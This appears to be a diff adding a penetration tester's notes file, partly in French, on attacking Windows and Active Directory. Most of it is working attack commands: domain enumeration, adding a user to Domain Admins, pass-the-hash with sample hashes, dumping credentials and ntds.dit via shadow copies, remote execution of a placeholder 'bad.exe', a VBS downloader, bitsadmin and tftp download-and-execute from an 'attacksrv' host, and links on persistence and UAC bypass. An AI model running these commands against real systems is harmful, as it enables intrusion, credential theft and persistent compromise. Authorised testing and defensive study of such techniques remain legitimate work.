@@ -1,0 +1,430 @@
+# windows
+
+# end of life / support
+http://support.microsoft.com/lifecycle/search/default.aspx?
+
+# logging
+http://sniperforensicstoolkit.squarespace.com/storage/logging/Windows%20Logging%20Cheat%20Sheet%20v1.1.pdf
+
+# version
+# http://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions
+# http://en.wikipedia.org/wiki/Ver_(command)
+4.0 NT4
+5.0 2000
+5.1 XP
+5.2 2003 & 2003 R2 or XP x64
+6.0 Vista or 2008
+6.1 Windows 7 or 2008 R2
+6.2 Windows 8 or Windows Server 2012
+6.3 Windows 8.1 or Windows Server 2012 R2
+
+# hashes
+LM: DES
+NT: MD4
+
+# comptes
+501 (0x1f5) -> compte guest
+
+# active directory
+controleur de domaine se reperent avec les ports ouverts suivants: 88, 389, 636, 53, 42
+
+* pour avoir la liste des DC
+nmblookup 'EXAMPLE#1c'
+nbquery (http://www.skullsecurity.org/wiki/index.php/Nbquery)
+dig @nameserver _ldap._tcp.dc._msdcs.example.com. SRV 
+nltest /dclist:EXAMPLE
+nslookup -type=srv _ldap...
+
+* pour avoir le PDC
+nmblookup 'EXAMPLE#1b' #http://ubiqx.org/cifs/Appendix-C.html
+dig @nameserver _ldap._tcp.pdc._msdcs.example.com. SRV
+nltest /dcname:EXAMPLE
+
+* DNS "zone transfer" (http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html)
+dns-dump.ps1 -zone projectmentor.net -dc dc1
+powershell -ep bypass -f dnsdump.ps1 -zone projectmentor.net -dc dc1 [-csv]
+
+* recon without admin rights
+https://adsecurity.org/?p=2535
+
+* rm -fr
+rmdir /s /q c:\windows\temp\tw 
+
+* tasklist
+taskkill /F /IM "cmd.exe" # killall
+
+* misc
+set logon server
+dsquery * domainroot -filter "&(objectCategory=computer)" -attr name -l -limit 0 # list all hosts in the domain
+
+* samdump http://sh4ka.fr/?p=1850
+bin/samba-tool join sh4kaindustry.local DC -U 'amoulu%test1234!'
+bin/samba-tool samdump
+
+* http://www.linuxposts.com/samba/36957-samba-samba-4-ad-native-mode.html
+net join bdc <domain>
+net samdump
+
+* schtasks
+schtasks /create /ru system /tn "blah" /tr "C:\temp\tw\scan.bat" /sc once /st 14:00:00  #or try to create it w/out any scheduling
+schtasks /run /tn "blah"
+schtasks /end /tn "blah"
+schtasks /delete /tn "blah"
+
+# port scanning with netsh
+netsh diag connect iphost 10.0.0.2 443 -> "Server appears to be running on port(s) [NONE] " vs. "Server appears to be running on port(s) [443]"
+
+# netbios / SMB scan
+* list what services are available
+nbtscan
+smbclient -U '%' -L 1.2.3.4
+
+* scan for shares
+nmbscan
+
+* cifs
+mount -t cifs -o user=user,password=secret,domain=DADOM '//10.0.0.1/c$' /mnt/pwn
+use -o soft to "soft mount" smb shares then you won't get lockups, etc. if the share disappears.
+not recommended for persistent shares, as you then want the kernel to do everything it can to restore the mount.
+
+* get mac from IP
+nbtstat -a 10.0.0.2
+
+# net(1) usage
+NB. [ads|rpc|rap] are optional, if omitted, net will try to determine it automatically
+
+net [rpc] info -l -U 'DOM\blah%p4ss' -S 192.168.56.101
+net [rpc] account # pw policy but doesnt work anymore, use enum4linux/polenum instead (https://labs.portcullis.co.uk/tools/)
+
+net [rpc] user
+net [rpc] user info <domain user> # list domain groups of user (without the "DOM\")
+net [rpc] share
+
+net [rpc] group list
+net [rpc] group members administrators
+net [rpc] group members 'Domain users'
+
+net [rpc] registry enumerate 'HKLM\Software'
+
+net [rpc] file
+
+net [rap] session # list of users connected to the server, but always shows empty on my vm (broken?)
+net [rap] server domain # list servers in this domain
+net [rap] domain # list domains
+net [rap] service
+
+net lookup host WKS123
+net lookup dc MAIN
+net lookup master MAIN
+
+net [rpc] trustdom list
+
+net [rap] printq
+
+NB. si certaines commandes ne retournent rien c peut etre parce qu'il faut un samba qui tourne en local
+
+* ajout dans Domain Admins sur un DC
+net user hsc * /add
+net group "Domain admins" hsc /add
+
+# hives
+python regfetch.py security.save 'Policy\Secrets\NL$KM\CurrVal' '(default)' | xxd
+python regfetch.py security.save 'Cache' 'NL$1' | xxd
+
+# hives backups
+c:\windows\repair or c:\windows\system32\config\regback (w2k8)
+
+# run cmd.exe as SYSTEM
+msf current_user_psexec (psh technique) // https://community.rapid7.com/community/metasploit/blog/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit
+or
+psexec -accepteula -i -s
+or
+sc create testsvc binpath= "cmd /K start" type= own type= interact
+sc start testsvc
+sc delete testsvc
+at / schtasks (wont work on recent windows)
+or
+metastploit meterpreter getsystem
+
+local admin to SYSTEM (w/ or w/out UAC) http://carnal0wnage.attackresearch.com/2013/07/admin-to-system-win7-with-remoteexe.html
+
+# dump creds
+dump local creds  -> offline with impacket/secretsdump.py or creddump/pwdump.py, online with fgdump (only domain accounts: fgdump.exe -c -v -a)
+dump domain creds -> offline with impacket/secretsdump.py or libesedb+ntdsxtract or msf-geek
+dump cached creds -> offline with impacket/secretsdump.py or creddump/cachedump.py, online with meterpreter/cachedump.rb or cachedump or fgdump
+dump lsa secrets  -> offline with impacket/secretsdump.py or creddump/lsadump.py, online with gsecdump
+dump in-memory creds -> offline with mimikatz (outbound SMB sessions), online with wce
+dump passwords remembered in Credential Manager -> netpass
+dump passwords remembered in Protected Storage (IE, Outlook) -> pspv
+dump passwords remembered by third-party software -> NirSoft tools, carrot, msf post modules
+most at http://bernardodamele.blogspot.com.au/
+
+# authenticated code execution 
+http://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/
+https://community.rapid7.com/community/metasploit/blog/2012/11/08/abusing-windows-remote-management-winrm-with-metasploit // use winrm to get a shell
+https://code.google.com/p/impacket/source/browse/trunk/examples/wmiexec.py
+
+# sysinternals/psexec alternatives (noisy: upload binary, creates service, etc.)
+* didnt seem to work on w2k12r2 during a pt
+pth/winexe impacket/psexec.py sysinternals/psexec
+
+* sysinternals/psexec.exe
+psexec -h  to bypass UAC
+
+* impacket/psexec.py (whoami => system)
+http://pen-testing.sans.org/blog/pen-testing/2013/03/27/psexec-python-rocks (import psexec)
+
+* WMI // needs DCOM access and beware about semi-interactive shells (eg. cant run cmds that would last long)
+impacket/wmiexec.py (whoami => user)
+pth/wmis
+http://www.room362.com/blog/2014/04/19/executing-code-via-smb-without-psexec/ (import wmiexec)
+http://passing-the-hash.blogspot.co.nz/2013/07/WMIS-PowerSploit-Shells.html
+
+* winexe-PTH (whoami => twadmin)
+winexe-PTH --uninstall -U DOM/twadmin%Password1 //10.0.0.1 cmd.exe
+
+* metasploit psexec.rb 
+http://carnal0wnage.attackresearch.com/2013/07/metasploit-standalone-psexec.html (uploaded .exe has to be a service executable)
+
+* Veil-Catapult
+http://diablohorn.wordpress.com/2013/10/19/alternative-psexec-no-wmi-services-or-mof-needed/
+
+# NT_STATUS_INVALID_WORKSTATION
+winexe --netbiosname=<name of target host>
+
+# pass-the-hash
+dint seem to work on w2k12r2 during pt: xfreerdp /pth
+
+http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/
+
+https://code.google.com/p/passing-the-hash/
+winexe --uninstall -U renadm%aad3b435b51404eeaad3b435b51404ee:780ede86e3d0878243a4fabd56d72644 //10.0.0.1 cmd.exe
+wmic -U demo/administrator%hash //172.16.1.1 "select csname,name,processid,sessionid from win32_process"
+wmis -U demo/administrator%hash //172.16.1.1 'cmd.exe /c dir c:\ > c:\windows\temp\blog.txt' # http://passing-the-hash.blogspot.com.au/
+smbclient -U demo\\user%aad3b435b51404eeaad3b435b51404ee:780ede86e3d0878243a4fabd56d72644
+smbget -w demo -u demo\\administrator -O -p <hash> smb://172.16.1.1/c$/windows/temp/blog.txt
+xfreerdp /pth:
+nmap --script-args smbuser=foo,smbhash=<nt-only-works>
+
+net time \\target
+at \\target HH:MM c:\path\to\bad.exe
+wmic /node:TARGET process call create "c:\path\to\bad.exe"
+sc \\target create blah binpath=c:\path\to\bad.exe
+sc \\target start blah
+
+# backtrack/forensic
+* post/windows/gather/enum_termserv
+list users who used mstsc and where they connected to
+
+* parse user artefacts
+with what tools?
+
+# enum users
+* nmap/smb-enum-users.nse
+./nmap -p U:137,T:139 --script smb-enum-users --script smb-enum-groups --script-args=smbusername=blah,smbpassword/smbhash=...,smbdomain=FOO,samronly=1 -vv 192.168.122.196
+
+* metasploit/auxiliary/scanner/smb/smb_enumusers
+list local users
+[*] 192.168.122.74 WIN-LEK1BKKKKD8 [ Administrator, Guest, foo ] ( LockoutTries=0 PasswordMin=0 )
+
+# enum logged-on users && hunt VIP
+* Derivative Local Admins
+https://www.sixdub.net/?p=591
+
+* eventlogs (need DA privs)
+psloglist.exe \\dc1.corp.com -u twadmin -p Password1 -s -i 4624,4768,4769 -accepteula security > %TEMP%\extract.csv
+Get-UserLogonEvents / Invoke-UserLogonHunter (http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/)
+
+* other stealthier ways
+https://www.netspi.com/blog/entryid/214/faster-domain-escalation-using-ldap
+https://www.netspi.com/blog/entryid/132/5-ways-to-find-systems-running-domain-admin-processes
+
+* http://www.slideshare.net/harmj0y/i-hunt-sys-admins
+impacket smbclient.py adm-lulz:Password123@192.168.122.23 -file <(echo who) # only lists inbound smb conns (same as net rap session but doesnt require admin creds)
+psloggedon (doesnt show source IP?)
+netsess.exe (can query remote computer, no admin privs required) http://www.joeware.net/freetools/tools/netsess/index.htm 
+PVEFindADUsers (need admin access) https://www.corelan.be/index.php/2009/07/12/free-tool-find-where-ad-users-are-logged-on-into/
+netview.exe (spray, no admin privs) https://github.com/mubix/netview
+smb-enum-sessions.nse (only need valid domain or local account) ./nmap --script smb-enum-sessions.nse --script-args=smbusername=administrator,smbpassword=Password1 -vv -p 445 10.0.0.0/24
+nbtenum.exe (http://nbtenum.sourceforge.net/) // never tested
+veil-powerview Invoke-UserHunter Invoket-StealthUserHunter (also checks if you're local admin) https://www.veil-framework.com/hunting-users-veil-framework/ http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
+powersploit/Invoke-TokenManipulation https://www.trustedsec.com/january-2015/account-hunting-invoke-tokenmanipulation/
+
+* metasploit 
+post/windows/gather/local_admin_search_enum.rb (query all domain machines to find where im local admin) // never tested
+post/windows/gather/enum_domain_users.rb (query all domain machines to find where target users are logged in | http://www.sensepost.com/blog/8764.html msf module better than PsLoggedOn?) // never tested
+auxiliary/scanner/smb/psexec_loggedin_users (doesnt list SMB sessions)
+auxiliary/scanner/smb/smb_enumusers_domain (determine what domain users are logged into a remote system) // never tested
+
+# harvest user/group in AD from parsing ntds.dit
+https://bitbucket.org/iwseclabs/bta
+
+# {meterpreter,psexec,psloggedon}-fu
+http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass
+
+# UAC bypass
+https://dfirblog.wordpress.com/2015/10/24/protecting-windows-networks-uac/
+https://github.com/hfiref0x/UACME
+
+# dump domain hashes using offline copy of ntds.dit and SYSTEM 
+* sc query vss
+
+* get path to ntds.dit (default location is c:\windows\ntds\ntds.dit)
+reg.exe query HKLM\System\CurrentControlSet\Services\NTDS\Parameters -> "DSA Database file"
+
+* copy ntds.dit using Volume Shadow Copy
+manually with ntdsutil or vssadmin (pre 2008)
+
+automatically with msf
+  - psexec_command: http://www.pentestgeek.com/2013/01/10/psexec_command-not-your-daddys-psexec
+  - pentestergeek: http://www.accuvant.com/blog/owning-computers-without-shell-access (msf-geek)
+
+reg.exe save hklm\system c:\temp\system.save
+
+* restore vss service to original state
+
+* extract hashes
+impacket/secretsdump.py
+or {
+libesedb: ./esedbexport -l /tmp/export.log -t /tmp/export ntds.dit {
+NTDSXtract: python dsusers.py /tmp/export/datatable.3 /tmp/export/link_table.5 --passwordhashes system.save
+or
+msf-geek: ntds_hashextract.rb /tmp/export/datatable.3 /ww/system.save }}
+
+# ntdsutil (http://technet.microsoft.com/en-us/library/cc753609(WS.10).aspx)
+ntdsutil.exe, snapshot, activate instance NTDS, list all, create, list all, mount 2, unmount 2, delete 1, quit
+or 
+ntdsutil.exe, ac in ntds, ifm, cr fu c:\test, q, q # https://bitbucket.org/iwseclabs/bta
+
+# vssadmin
+sc query vss
+vssadmin create shadow /for=C: // write down the uuid
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy..\Windows\NTDS\ntds.dit \\mylatop\share\ntds.dit
+vssadmin delete Shadows /Shadow={<UUID>} 
+sc stop vss
+sc query vss
+
+# ntds explorer
+https://github.com/yosqueoy/ditsnap
+
+# dump in-memory passwords
+* mimikatz+powershell to dump lots of hosts
+http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html 
+
+# wget in vbs (kyp)
+echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")>>wget.vbs
+echo objXMLHTTP.open "GET", WScript.Arguments(0),false>>wget.vbs
+echo objXMLHTTP.send()>>wget.vbs
+echo if objXMLHTTP.Status = 200 Then>>wget.vbs
+echo    Set objADOStream = CreateObject("ADODB.Stream")>>wget.vbs
+echo    objADOStream.Open>>wget.vbs
+echo    objADOStream.Type = 1 'adTypeBinary>>wget.vbs
+echo    objADOStream.Write objXMLHTTP.ResponseBody>>wget.vbs
+echo    objADOStream.Position = 0>>wget.vbs
+echo    Set objFSO = Createobject("Scripting.FileSystemObject")>>wget.vbs
+echo    Set objFSO = Nothing>>wget.vbs
+echo    objADOStream.SaveToFile LCase(WScript.Arguments(1))>>wget.vbs
+echo    objADOStream.Close>>wget.vbs
+echo    Set objADOStream = Nothing>>wget.vbs
+echo  End if>>wget.vbs
+echo Set objXMLHTTP = Nothing>>wget.vbs
+
+# download and execute
+* with the BITSAdmin tool (win7+)
+bitsadmin /transfer job_name /download http://domain.com/file_name.exe c:\file_path\file_name.exe
+voir le sploit msf 
+* with mshta (cf. exploit modules in msf)
+* ipmo
+PS C:\> ipmo BitsTransfer;Start-BitsTransfer -Source http://foo/nc.exe -Destination C:\Windows\Temp\
+* Enable the tftp client in Vista & higher, and pull files to a compromised server:
+C:\> ocsetup TFTP /quiet
+C:\> tftp -i attacksrv get bin.exe
+
+# bypass gpo proxy settings with regedit
+http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry/
+
+# know windows processes
+http://sysforensics.org/2014/01/know-your-windows-processes.html
+
+# bypass GPO path restrictions for Runas
+https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1
+
+# ssp filter
+http://kobyk.wordpress.com/2008/08/30/implementing-an-lsa-proxy-authentication-package/
+http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html (requires reboot)
+http://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/ (inject dll into lsass)
+https://code.google.com/p/mimikatz/source/browse/trunk/kiwissp/kiwissp.c (another example of ssp)
+
+# client side exploitation + priv escalation
+https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module/
+
+# domain trusts
+http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/
+http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/
+http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/
+
+# use netsh to capture network traffic
+http://high54security.blogspot.co.nz/2015/03/netsh-trace-when-installing-winpcap-or.html
+https://isc.sans.edu/diary/No+Wireshark%3F+No+TCPDump%3F+No+Problem%21/19409
+
+# persistence
+http://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/ # run task even if i'm not logged-in
+https://www.pentestgeek.com/2013/02/11/scheduled-tasks-with-s4u-and-on-demand-persistence/ (msf/s4u_persistence.rb)
+https://enigma0x3.wordpress.com/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/
+http://jumpespjump.blogspot.co.nz/2015/03/thousand-ways-to-backdoor-windows.html
+http://blakhal0.blogspot.com.au/2015/03/windows-event-log-driven-back-doors.html
+https://gist.github.com/subTee/e07e4a8aa6dc0e1cdf5d (Execute Shellcode From Registry with InstallUtil.exe)
+https://adsecurity.org/?p=1906
+
+# the DC machine account is DA
+http://room362.blogspot.co.nz/2015/09/using-domain-controller-account.html
+
+# finding where GPP account is a local admin
+http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
+
+# most common AD security issues
+https://adsecurity.org/?p=1684
+
+# lnk vuln
+ms10-046 Stuxnet, incomplete fix cve-2015-0096, patched again with ms15-020: http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459
+
+# RCEs
+# https://technet.microsoft.com/en-us/library/security/dn631937.aspx
+* ms03-039 (CVE-2003-0605)
+w2k SP1-4, XP SP0-1, w2k3?
+https://www.exploit-db.com/exploits/76/
+
+* ms06_040
+vuln: windows NT4 forever, Windows 2000 before SP5 or missing KB921883 which was included in SP5 (you can manually check the installed KBs at hklm\software\microsoft\updates\windows 2000)
+
+* ms08_067
+vuln: windows 2000 before SP5 or missing KB958644
+http://technet.microsoft.com/en-us/security/bulletin/ms08-067
+http://support.microsoft.com/kb/958644
+
+* report template
+While the 1.2.3.4 system was actually compromised, a large amount (379) of additional systems appear to be missing the same security patch.  
+$client should investigate the rest of these systems (Systems.Missing.Service.Packs.txt file located in the Documents tab) to ensure they are receiving security patches.
+Any unsupported systems were listed (Server 2000), as well as XP with less than SP3 installed, and Server 2003 with less than SP2 installed.
+
+* ms14-066
+http://blog.beyondtrust.com/triggering-ms14-066 https://github.com/anexia-it/winshock-test
+
+* ms14-068
+http://adsecurity.org/?p=676
+https://technet.microsoft.com/library/security/MS14-068
+KB3011780
+
+* ms14-70 (CVE-2014-4076)
+local on 2003 x86 and XP (forever unpatched unless you pay)
+https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt
+
+* skeleton key (for persistence)
+http://adsecurity.org/?p=1275 http://adsecurity.org/?p=1255
+
+* ms15-011 (mwr)
+https://blog.coresecurity.com/2015/05/18/ms15-011-microsoft-windows-group-policy-real-exploitation-via-a-smb-mitm-attack/
+https://youtu.be/wVLD2iT6ADo?t=198
+https://twitter.com/mubix/status/652325775891374080
+https://labs.mwrinfosecurity.com/blog/2015/04/02/how-to-own-any-windows-network-with-group-policy-hijacking-attacks/
+https://labs.mwrinfosecurity.com/blog/2015/02/13/practically-exploiting-ms15-014-and-ms15-011/
